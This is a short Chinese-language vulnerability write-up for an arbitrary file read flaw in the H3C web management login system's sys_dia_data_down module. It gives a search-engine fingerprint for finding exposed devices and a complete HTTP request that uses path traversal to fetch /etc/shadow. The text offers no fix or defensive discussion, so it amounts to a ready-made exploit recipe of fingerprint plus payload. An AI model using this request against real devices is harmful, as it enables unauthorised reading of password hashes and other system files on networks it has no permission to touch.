# H3C Web网管登录系统jQuery-1.7.2存在任意文件读取

# <font style="color:rgb(0, 0, 0);">一、漏洞简介</font>
H3C Web网管登录系统jQuery-1.7.2存在任意文件读取漏洞，其1.7.2版本的sys_dia_data_down模块存在任意文件读取漏洞，攻击者可通过前台读取任意文件。

## <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ <font style="color:rgb(0, 0, 0);">H3C用户网管登录系统</font>

# <font style="color:rgb(0, 0, 0);">三、资产测绘</font>
+ <font style="color:rgb(0, 0, 0);">hunter</font>`web.body="webui/js/jquerylib/jquery-1.7.2.min.js"`
+ <font style="color:rgb(0, 0, 0);">特征</font>

![1699976084811-ac173385-4963-406a-ba41-d03251a1c453.png](./img/TwNVOLVx89ZNCJov/1699976084811-ac173385-4963-406a-ba41-d03251a1c453-175462.png)

# <font style="color:rgb(0, 0, 0);">四、漏洞复现</font>
```plain
  GET /webui/?g=sys_dia_data_down&file_name=../../../../../etc/shadow HTTP/1.1
  Host: xx.xx.xx.xx
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Connection: close
  Cookie: USGSESSID=a9523e6ede287f558817c3bbcf9a60be
  Upgrade-Insecure-Requests: 1
```

![1694660996937-199bec25-d529-4f3a-aa85-d888280b1627.png](./img/TwNVOLVx89ZNCJov/1694660996937-199bec25-d529-4f3a-aa85-d888280b1627-831084.png)



> 更新: 2024-02-29 23:57:19  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/spgv7orsuvd67clb>